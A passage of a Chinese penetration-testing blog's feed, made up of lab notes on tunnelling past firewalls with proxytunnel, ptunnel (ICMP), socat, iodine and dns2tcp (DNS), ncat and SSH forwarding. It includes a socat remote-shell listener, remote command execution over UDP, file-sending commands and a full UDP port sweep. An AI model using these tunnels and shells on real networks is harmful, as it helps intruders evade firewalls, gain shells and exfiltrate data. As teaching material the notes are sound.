      <category term="nmap" scheme="http://c.cat.plus/tags/nmap/"/>
    
      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="sslh" scheme="http://c.cat.plus/tags/sslh/"/>
    
  </entry>
  
  <entry>
    <title>HTTP代理隧道工具-proxytunnel</title>
    <link href="http://c.cat.plus/2015/07/09/Traffic_manipulation/HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-proxytunnel/"/>
    <id>http://c.cat.plus/2015/07/09/Traffic_manipulation/HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-proxytunnel/</id>
    <published>2015-07-09T10:31:02.000Z</published>
    <updated>2020-06-05T07:17:28.578Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="proxytunnel"><a href="#proxytunnel" class="headerlink" title="proxytunnel"></a><strong>proxytunnel</strong></h3></blockquote><ul><li>通过标准的HTTP/HTTPS代理创建隧道的工具</li><li>通过HTTP Connect 方法封装信息</li><li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li><li>无法创建DNS隧道和ICMP隧道</li></ul><h4 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a><strong>Lab1</strong></h4><h5 id="将外网资源映射为内网指定端口"><a href="#将外网资源映射为内网指定端口" class="headerlink" title="将外网资源映射为内网指定端口"></a><strong>将外网资源映射为内网指定端口</strong></h5><ul><li>内网安装squid3代理,proxytunnel<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;squid3&#x2F;squid.conf</span><br><span class="line">&#x2F;^http_port</span><br><span class="line">&#x2F;^http_access#改allow</span><br><span class="line">&#x2F;^acl</span><br></pre></td></tr></table></figure></li></ul><p>创建隧道:</p><pre><code>proxytunnel -a 80 -p 127.0.0.1:3128 -d 192.168.1.1:80</code></pre><h4 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a><strong>Lab2</strong></h4><h5 id="外网资源非防火墙允许端口"><a href="#外网资源非防火墙允许端口" class="headerlink" title="外网资源非防火墙允许端口"></a><strong>外网资源非防火墙允许端口</strong></h5><ul><li>修改目标资源侦听端口可能无法躲避防火墙深层检测</li><li>外网安装squid3代理服务器并侦听80端口</li><li>创建隧道:<pre><code>proxytunnle -a 80 -p 127.0.0.1:3128 -r 192.168.1.1:80 -d 192.168.1.1:22</code></pre></li></ul><h4 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a><strong>Lab3</strong></h4><h5 id="ssh客户端配置自动创建代理链隧道"><a href="#ssh客户端配置自动创建代理链隧道" class="headerlink" title="ssh客户端配置自动创建代理链隧道"></a><strong>ssh客户端配置自动创建代理链隧道</strong></h5><pre><code>vi ~/.ssh/configHost 192.168.1.1    Hostname 192.168.1.1    ProtocolKeepAlives 30    ProxyCommand /usr/bin/proxytunnel -p 1.1.1.1:3128 -r 192.168.1.1:80 -d %h:%p</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;proxytunnel&quot;&gt;&lt;a href=&quot;#proxytunnel&quot; class=&quot;headerlink&quot; title=&quot;proxytunnel&quot;&gt;&lt;/a&gt;&lt;strong&gt;proxytunnel&lt;/strong&gt;&lt;/h3&gt;&lt;/block
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
    
      <category term="proxytunnel" scheme="http://c.cat.plus/tags/proxytunnel/"/>
    
      <category term="HTTP隧道" scheme="http://c.cat.plus/tags/HTTP%E9%9A%A7%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>ptunnel基于ICMP协议的隧道工具</title>
    <link href="http://c.cat.plus/2015/07/09/Traffic_manipulation/ptunnel%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/"/>
    <id>http://c.cat.plus/2015/07/09/Traffic_manipulation/ptunnel%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/</id>
    <published>2015-07-08T16:51:01.000Z</published>
    <updated>2020-06-02T15:00:05.533Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a><strong>ptunnel</strong></h3><p>Ping tunnel ICMP隧道工具</p></blockquote><ul><li>通过ICMP echo(ping requests)和reply(ping reply)实现隧道</li><li>适用于防火墙只允许ping出站流量的环境</li><li>支持多并发连接,性能优</li><li>支持身份验证</li><li>需要root权限</li><li>支持抓包<br>  Win:winpacap<br>  Linux:libpcap</li><li>工作过程<br>  Proxy,Client,Destination</li></ul><p><strong>Server</strong></p><pre><code>ptunnel -x 1234</code></pre><p><strong>Client</strong></p><pre><code>sudo ptunnel -p proxy -lp 2222 -da destination -dp 22 -x 1234</code></pre><h4 id="嵌套SSH隧道"><a href="#嵌套SSH隧道" class="headerlink" title="嵌套SSH隧道"></a><strong>嵌套SSH隧道</strong></h4><pre><code>ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></pre><ul><li>ptunnel 直到目前的最新版本仍存在拒绝服务漏洞-0.72</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;ptunnel&quot;&gt;&lt;a href=&quot;#ptunnel&quot; class=&quot;headerlink&quot; title=&quot;ptunnel&quot;&gt;&lt;/a&gt;&lt;strong&gt;ptunnel&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;Ping tunnel ICMP隧道工具
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
    
      <category term="ptunnel" scheme="http://c.cat.plus/tags/ptunnel/"/>
    
      <category term="ICMP" scheme="http://c.cat.plus/tags/ICMP/"/>
    
  </entry>
  
  <entry>
    <title>socat数据流通道工具做端口转发</title>
    <link href="http://c.cat.plus/2015/07/07/Traffic_manipulation/socat%E6%95%B0%E6%8D%AE%E6%B5%81%E9%80%9A%E9%81%93%E5%B7%A5%E5%85%B7%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://c.cat.plus/2015/07/07/Traffic_manipulation/socat%E6%95%B0%E6%8D%AE%E6%B5%81%E9%80%9A%E9%81%93%E5%B7%A5%E5%85%B7%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2015-07-07T10:21:21.000Z</published>
    <updated>2020-06-02T15:01:45.885Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="SOCAT"><a href="#SOCAT" class="headerlink" title="SOCAT"></a><strong>SOCAT</strong></h3></blockquote><ul><li>被称为nc++ (增强增强版的nc)<br>  双向数据流通道工具</li></ul><p><strong>连接端口</strong></p><pre><code>socat - tcp:1.1.1.1:80</code></pre><p><strong>侦听端口</strong></p><pre><code>socat - tcp4-listen:22        /    socat - tcp-l:333</code></pre><p><strong>接收文件</strong></p><pre><code>socat tcp4-listen:333 open:2.txt,creat,append</code></pre><p><strong>发送文件</strong></p><pre><code>cat 1.txt | socat - tcp4:1.1.1.1:333</code></pre><h4 id="远程shell-–服务器端"><a href="#远程shell-–服务器端" class="headerlink" title="远程shell –服务器端"></a><strong>远程shell</strong> –服务器端</h4><pre><code>Server: socat tcp-l:23 exec:sh,pty,stderrClient: socat - tcp:1.1.1.1:23</code></pre><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a><strong>端口转发</strong></h4><pre><code>socat tcp4-listen:8080,fork tcp4:192.168.254.254:80</code></pre><h4 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a><strong>远程执行命令</strong></h4><pre><code>Server: socat - udp-l:2001Client: echo &quot;`id`&quot; | socat - udp4-datagram:1.1.1.1:2001</code></pre><h4 id="UDP-全端口任意内容发包"><a href="#UDP-全端口任意内容发包" class="headerlink" title="UDP 全端口任意内容发包"></a><strong>UDP 全端口任意内容发包</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PORT in &#123;1..65535&#125;; do echo &quot;aaaaa&quot; | socat - UDP4-DATAGRAM: 1.1.1.1:$PORT; sleep .1; done</span><br></pre></td></tr></table></figure><h4 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a><strong>二进制编辑器</strong></h4><pre><code>echo -e &quot;\0\14\0\0\c&quot; | socat -u - file:/usr/bin/ squid.exe,seek,seek=0x00074420</code></pre><h4 id="简单的web服务器"><a href="#简单的web服务器" class="headerlink" title="简单的web服务器"></a><strong>简单的web服务器</strong></h4><pre><code>socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:&quot;echo -e \&quot;\\ \&quot;HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\ \nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \ $SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\ \\&quot;\&quot;&quot;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;SOCAT&quot;&gt;&lt;a href=&quot;#SOCAT&quot; class=&quot;headerlink&quot; title=&quot;SOCAT&quot;&gt;&lt;/a&gt;&lt;strong&gt;SOCAT&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;被称为nc++ 
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="socat" scheme="http://c.cat.plus/tags/socat/"/>
    
  </entry>
  
  <entry>
    <title>DNS协议隧道iodine及ncat</title>
    <link href="http://c.cat.plus/2015/07/06/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93iodine%E5%8F%8Ancat/"/>
    <id>http://c.cat.plus/2015/07/06/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93iodine%E5%8F%8Ancat/</id>
    <published>2015-07-06T11:31:27.000Z</published>
    <updated>2020-05-29T09:15:57.980Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="iodine-碘"><a href="#iodine-碘" class="headerlink" title="iodine    #碘"></a><strong>iodine</strong>    #碘</h3><p>基于DNS查询的隧道工具<br>与同类工具相比的优点</p></blockquote><ul><li>对下行数据不进行编码,因此性能优</li><li>支持多平台:Linux,BSD,Mac OS,Windows</li><li>最大16个并发连接</li><li>强制密码支持</li><li>支持同网段隧道IP(不同于服务器,客户端网段)</li><li>支持多种DNS纪录类型</li><li>丰富的隧道质量检测措施</li></ul><p><strong>运行服务器端</strong></p><pre><code>iodined -f -c 10.0.0.1 test.lab.com-f :    前端显示(可选)-c :    不检查客户端IP地址IP :    服务器端的隧道IP地址</code></pre><p><strong>运行客户端</strong></p><pre><code>iodine -f test.lab.comcurl --socks5-hostname 127.0.0.1:7001 http://www.sina.com</code></pre><p><strong>隧道网络接口</strong></p><ul><li>不基于资源的通用隧道,如同本网段内两台相邻的主机</li><li>服务器和客户端分别生成隧道网络接口dns0</li><li>隧道两端接口的IP地址应不同于客户端和服务器网段</li><li>基于此隧道可嵌套其它隧道技术<br>  <code>ssh -CfNg -D 7001 root@10.0.0.1</code></li></ul><p><strong>iodine for Windows</strong><br>安装TAP网卡驱动<br><code>https://openvpn.net/index.php/open-source/downloads.html</code><br>只安装TAP Virtual Ethernet Adapter和所有依赖包<br>Windows客户端</p><pre><code>http://code.kryo.se/iodine/iodine -f test.lab.com建立SSH隧道</code></pre><blockquote><h3 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a><strong>NCAT</strong></h3></blockquote><ul><li>被称为众多NC衍生版软件中最优的选择,不是一个单独的软件,包含在nmap套件中</li></ul><p><strong>代理功能</strong></p><pre><code>ncat -l 8080 --proxy-type http --proxy-auth user:pass</code></pre><p><strong>Broker中介代理功能</strong> #类似于早于交换机的hub功能</p><ul><li>AB不通但AC,BC互通</li><li>服务器: <code>ncat -l 333 --broker</code></li><li>客户端之间发送任何信息都会被hub到其他客户端</li><li>批量执行命令: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat 1.1.1.1 --sh-exec &quot;echo &#96;pwd&#96;&quot;</span><br></pre></td></tr></table></figure></li><li>批量传文件: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --send-only 1.1.1.1 &lt; inputfile</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;iodine-碘&quot;&gt;&lt;a href=&quot;#iodine-碘&quot; class=&quot;headerlink&quot; title=&quot;iodine    #碘&quot;&gt;&lt;/a&gt;&lt;strong&gt;iodine&lt;/strong&gt;    #碘&lt;/h3&gt;&lt;p&gt;基于DNS查询的
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
    
      <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
    
      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
    
      <category term="ncat" scheme="http://c.cat.plus/tags/ncat/"/>
    
      <category term="iodine" scheme="http://c.cat.plus/tags/iodine/"/>
    
      <category term="ssh" scheme="http://c.cat.plus/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>DNS协议隧道-dns2tcp</title>
    <link href="http://c.cat.plus/2015/07/05/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93-dns2tcp/"/>
    <id>http://c.cat.plus/2015/07/05/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93-dns2tcp/</id>
    <published>2015-07-05T10:33:17.000Z</published>
    <updated>2020-05-29T09:05:10.288Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="DNS协议隧道"><a href="#DNS协议隧道" class="headerlink" title="DNS协议隧道"></a>DNS协议隧道</h3><p><strong>防火墙禁止TCP出站访问流量</strong></p></blockquote><ul><li>SSH隧道,端口转发全部失效</li><li>使用基于UDP协议的隧道</li><li>DNS的工作原理适合用于实现隧道</li></ul><p><strong>DNS工作原理</strong></p><ul><li>DNS隧道原理:注册受自己控制的DNS纪录</li></ul><h4 id="dns2tcp"><a href="#dns2tcp" class="headerlink" title="dns2tcp"></a><strong>dns2tcp</strong></h4><ul><li>利用合法DNS服务器实现DNS隧道</li><li>C/S(dns2tcpc / dns2tcpd)结构</li><li>通过TXT纪录加密传输数据(A纪录长度有限)</li><li>隧道建立后保持连接</li><li>默认纪录生存时间值为3秒</li></ul><p><strong>dns2tcp的作用</strong></p><ul><li>把TCP流量封装到DNS协议里面,通过DNS隧道来进行信息传递,通过这种方法可以绕过防火墙对内网的限制</li></ul><p><strong>安装</strong></p><pre><code>apt-get install dns2tcpKali默认安装</code></pre><p><strong>服务端配置文件</strong></p><pre><code>/etc/dns2tcpd.conf.dns2tcpd资源可以是其它网址</code></pre><p><strong>启动</strong></p><pre><code>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf-F:        #前端运行-d:    ғdebug level 1-3-f: 指定配置文件</code></pre><blockquote><p>测试环境1:</p></blockquote><ul><li>Windows 03: 安装DNS服务;配置转发器;创建区域lab.com;指派二级域test.lab.com;NS纪录指向Kali</li><li>WAF: 只允许出站 UDP 53端口流量</li><li>Bodhi: 安装dns2tcp,wireshark,firefox<br>  <code>dns2tcpc -c -k pass -d 1 -l 2222 -r ssh -z test.lab.com</code></li></ul><p><strong>资源访问</strong></p><ul><li>本地SSH资源</li><li>远程http资源</li><li>http代理(squid)<br>  <code>apt-get install squid3</code></li><li>https代理</li><li>隧道嵌套<br>  基于SSH资源将SSH动态端口转发隧道嵌套于DNS隧道中<br>  <code>ssh -CfNg root@127.0.0.1 -p 2222 -D 7001</code><br>  XP IE,Firefox使用嵌套的Socks代理上网</li><li>抓包分析DNS隧道通信</li></ul><blockquote><p>测试环境2:</p></blockquote><ul><li>FW限制只允许内网DNS服务器访问外网指定DNS服务器UDP 53端口</li><li>内网DNS服务器:安装DNS服务,配置转发器到外网DNS服务器</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;DNS协议隧道&quot;&gt;&lt;a href=&quot;#DNS协议隧道&quot; class=&quot;headerlink&quot; title=&quot;DNS协议隧道&quot;&gt;&lt;/a&gt;DNS协议隧道&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;防火墙禁止TCP出站访问流量&lt;/strong&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="Kali" scheme="http://c.cat.plus/tags/Kali/"/>
    
      <category term="dns2tcp" scheme="http://c.cat.plus/tags/dns2tcp/"/>
    
      <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
    
      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
    
      <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
    
      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
    
      <category term="Bodhi" scheme="http://c.cat.plus/tags/Bodhi/"/>
    
  </entry>
  
  <entry>
    <title>SSH远程端口转发和动态端口转发以及X协议转发</title>
    <link href="http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A5%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/"/>
    <id>http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A5%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/</id>
    <published>2015-07-03T11:26:37.000Z</published>
    <updated>2020-05-29T09:28:41.540Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a><strong>SSH远程端口转发</strong></h3><p>由于ACL等原因,SSH与应用连接建立方向相反</p></blockquote><h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a><strong>本地端口转发</strong></h4><ul><li>SSH客户端+应用客户端位于FW一端</li><li>SSH服务端+应用服务端位于另一端</li></ul><h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a><strong>远程端口转发</strong></h4><ul><li><p>SSH客户端,应用客户端位于FW两端</p></li><li><p>SSH服务端,应用服务端位于FW两端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -fNg -R &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;SSH server&gt; -p &lt;ssh server port&gt;</span><br><span class="line">ssh -CfNg -R 7001:1.1.1.11:80 root@192.168.254.118 -p 53#WEB应用端口转发</span><br><span class="line">ssh -CfNg -R 7002:1.1.1.11:3389 root@192.168.254.118 -p 53#RDP应用端口转发</span><br><span class="line">ssh -CfNg -R 7003:1.1.1.11:3333 root@192.168.254.118 -p 53#NC应用端口转发</span><br></pre></td></tr></table></figure></li><li><p>之所以称为远程,是因为SSH侦听端口开在远程的SSH Server上</p></li><li><p>侦听端口永远开在应用客户端一方</p></li><li><p>WEB,RDP,NC应用端口转发测试</p></li></ul><blockquote><h3 id="SSH-动态端口转发"><a href="#SSH-动态端口转发" class="headerlink" title="SSH 动态端口转发"></a><strong>SSH 动态端口转发</strong></h3></blockquote><p><strong>本地,远程端口转发都需要固定应用服务器IP,Port</strong></p><ul><li>应用端口繁多,逐个转发效率低</li><li>某些应用不固定端口</li><li>某些网站不支持IP直接访问</li><li>使用非受信网络上网时保护流量不被嗅探</li></ul><p><strong>本地侦听socks4/5代理端口</strong></p><ul><li>由SSH server决定如何转发</li><li>作为翻墙代理使用</li><li>配置客户端代理(浏览器)</li><li>使用 <strong>proxychains</strong> 支持无代理客户端<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 7001 root@1.1.1.1 -p 2121</span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="X-协议转发"><a href="#X-协议转发" class="headerlink" title="X 协议转发"></a><strong>X 协议转发</strong></h3></blockquote><ul><li>远程登录Linux GUI运行图形化界面工具<br>  VNC<br>  X Windows</li><li>防火墙限制访问时<br>  基于SSH的X转发<br>  <code>ssh -X user@1.1.1.1 -p 53</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;SSH远程端口转发&quot;&gt;&lt;a href=&quot;#SSH远程端口转发&quot; class=&quot;headerlink&quot; title=&quot;SSH远程端口转发&quot;&gt;&lt;/a&gt;&lt;strong&gt;SSH远程端口转发&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;由于ACL等原因,SSH
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
    
      <category term="VNC" scheme="http://c.cat.plus/tags/VNC/"/>
    
      <category term="proxychains" scheme="http://c.cat.plus/tags/proxychains/"/>
    
  </entry>
  
</feed>
